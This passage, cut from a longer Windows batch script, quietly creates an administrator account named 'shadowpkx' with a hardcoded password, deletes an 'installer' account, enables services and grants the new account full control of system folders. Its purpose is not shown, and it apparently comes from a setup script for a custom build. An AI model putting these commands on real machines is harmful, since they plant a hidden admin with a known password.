...
net user shadowpkx ShadowPKx123 /add >nul
net localgroup administrators shadowpkx /add >nul
net user shadowpkx /active:yes >nul
net user installer /delete
diskperf -Y >nul
sc config Audiosrv start= auto >nul
sc start audiosrv >nul
ICACLS C:\Windows\Temp /grant shadowpkx:F >nul
ICACLS C:\Windows\installer /grant shadowpkx:F >nul
